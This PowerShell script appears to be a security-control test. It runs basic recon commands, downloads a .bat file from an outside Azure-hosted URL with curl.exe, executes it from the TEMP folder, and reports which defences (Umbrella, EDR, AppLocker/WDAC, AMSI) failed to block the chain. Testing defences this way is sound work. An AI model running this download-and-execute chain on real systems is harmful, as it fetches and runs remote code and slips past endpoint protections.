

# ----------------------------------------------------------
# CONFIGURATION — replace URL with your test server URL
# ----------------------------------------------------------
$downloadUrl  = "https://perfectworld.azurewebsites.net/test_bat.bat"   # <-- replace this
$outputFile   = "$env:TEMP\pt_test_bat.bat"

# ----------------------------------------------------------
# STEP 1 — Basic system recon (whoami, hostname, dir)
# ----------------------------------------------------------
Write-Host "[*] Running basic recon commands..." -ForegroundColor Yellow
Write-Host ""

Write-Host "[+] whoami:" -ForegroundColor Green
whoami

Write-Host ""
Write-Host "[+] hostname:" -ForegroundColor Green
hostname

Write-Host ""
Write-Host "[+] Directory listing of current path (dir):" -ForegroundColor Green
Get-ChildItem -Path $PWD | Format-Table Name, Length, LastWriteTime -AutoSize

Write-Host ""

# ----------------------------------------------------------
# STEP 2 — Download .bat file from URL using curl
# ----------------------------------------------------------
Write-Host "[*] Attempting to download BAT file from:" -ForegroundColor Yellow
Write-Host "    $downloadUrl" -ForegroundColor White
Write-Host ""

try {
    # Using curl.exe explicitly (not the PowerShell Invoke-WebRequest alias)
    $curlResult = & curl.exe -s -o $outputFile -w "%{http_code}" $downloadUrl 2>&1
    $httpCode = $curlResult.Trim()

    if ($httpCode -eq "200") {
        Write-Host "[+] Download succeeded. HTTP $httpCode" -ForegroundColor Green
        Write-Host "[+] File saved to: $outputFile" -ForegroundColor Green
    } else {
        Write-Host "[-] Download returned HTTP $httpCode" -ForegroundColor Red
        Write-Host "[-] This may indicate Umbrella/SWG blocked the download." -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host "[-] curl.exe failed: $_" -ForegroundColor Red
    Write-Host "[-] Possible causes: curl not available, DNS blocked, or proxy blocking." -ForegroundColor Red
    exit 1
}

# ----------------------------------------------------------
# STEP 3 — Verify file exists on disk after download
# ----------------------------------------------------------
if (Test-Path $outputFile) {
    $fileSize = (Get-Item $outputFile).Length
    Write-Host "[+] File confirmed on disk. Size: $fileSize bytes" -ForegroundColor Green
} else {
    Write-Host "[-] File not found after download — likely blocked by AV/EDR on write." -ForegroundColor Red
    exit 1
}

Write-Host ""

# ----------------------------------------------------------
# STEP 4 — Execute the downloaded BAT file
# ----------------------------------------------------------
Write-Host "[*] Attempting to execute downloaded BAT file..." -ForegroundColor Yellow
Write-Host ""

try {
    & cmd.exe /c $outputFile
    Write-Host ""
    Write-Host "[+] BAT file execution returned successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Execution failed or was blocked: $_" -ForegroundColor Red
    exit 1
}

# ----------------------------------------------------------
# STEP 5 — Result
# ----------------------------------------------------------
Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  DOWNLOAD AND EXECUTION ALLOWED            " -ForegroundColor Red
Write-Host "  >> EDR/AV/SWG did NOT block this chain << " -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[!] If you see this message, the following controls need review:" -ForegroundColor Yellow
Write-Host "    - Cisco Umbrella SWG did not block the file download" -ForegroundColor White
Write-Host "    - EDR did not flag curl.exe downloading a .bat file" -ForegroundColor White
Write-Host "    - AppLocker/WDAC did not block execution from TEMP path" -ForegroundColor White
Write-Host "    - AMSI did not intercept the PowerShell execution chain" -ForegroundColor White
Write-Host ""

# ----------------------------------------------------------
# CLEANUP — remove downloaded file after test
# ----------------------------------------------------------
if (Test-Path $outputFile) {
    Remove-Item $outputFile -Force
    Write-Host "[*] Cleanup complete — test file removed from disk." -ForegroundColor DarkGray
}
